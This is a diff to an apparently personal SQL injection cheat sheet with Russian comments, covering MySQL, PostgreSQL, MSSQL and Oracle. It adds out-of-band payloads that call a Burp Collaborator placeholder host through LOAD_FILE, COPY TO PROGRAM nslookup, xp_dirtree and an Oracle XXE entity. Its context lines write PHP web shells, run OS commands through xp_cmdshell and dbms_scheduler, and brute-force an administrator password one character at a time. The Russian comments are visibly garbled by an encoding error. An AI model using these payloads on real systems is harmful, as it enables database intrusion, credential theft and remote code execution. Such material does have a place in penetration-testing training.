@@ -109,6 +109,9 @@ Blind-based
 ' union select ' \"<?php system(\$_GET['cmd']);?>\"' into outfile 'C:\\Windows\\Temp\\shell.php' -- //
 	запись в файл (нужны права, файл не должен существовать), провер€ть количество столбцов не об€зательно, но желательно
 
+LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
+SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
+	взаимодействие с Burp Collaborator, работает только на винде
 
 ========================================================
 ================SQL INJECTION. PostgreSQL 5432
@@ -170,6 +173,8 @@ Error-based:
 '+and+(select+substring(password,1,1)+from+users+where+username='administrator')='a'+-- // прогон парол€ посимвольно в интрудере бурпа
 '+and+(select+substring(password,1,14)+from+users+where+username='administrator')='gwm4bpt90wwtwa'+-- // процесс, когда уже нашлись 13 символов,
 	последн€€ буква 'a' ставитс€ в значок параграфа дл€ перебора, Payloads  - Brouteforcer с длинами от 1 до 1
+
+copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN' 	взаимодействие с Burp Collaborator
 
 
 ========================================================
@@ -235,6 +240,8 @@ Blind injectin:
 ѕроверка результата, когда надо проверить какую строку вывела команда
 CREATE TABLE #tmp (output VARCHAR(1000)); INSERT INTO #tmp EXECUTE xp_cmdshell 'whoami'; 
 IF (SELECT TOP 1 output FROM #tmp) = 'NT SERVICE\MSSQL$SQLEXPRESS' waitfor delay '00:00:05'; DROP TABLE #tmp; 
+
+exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a' 	взаимодейтвие с Burp Collaborator
 
 
 ========================================================
@@ -302,6 +309,9 @@ select utl_file.fclose(file_handle) from dual;                    -- закрыть
 declare f utl_file.file_type; begin f:=utl_file.fopen('/tmp','shell.php','w'); utl_file.put_line(f,'<?php system($_GET["cmd"]); ?>'); utl_file.fclose(f); end; --
 	запись в файл
 select dbms_scheduler.create_job(job_name=>'cmd',job_type=>'executable',job_action=>'/bin/sh -c "whoami > /tmp/out"',enabled=>true) from dual;
+
+'+||+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual+--+
+	взаимодействие с Burp Collaborator, у€звимость XXE еще много где есть, хот€ и закрыта
 
 
 ========================================================
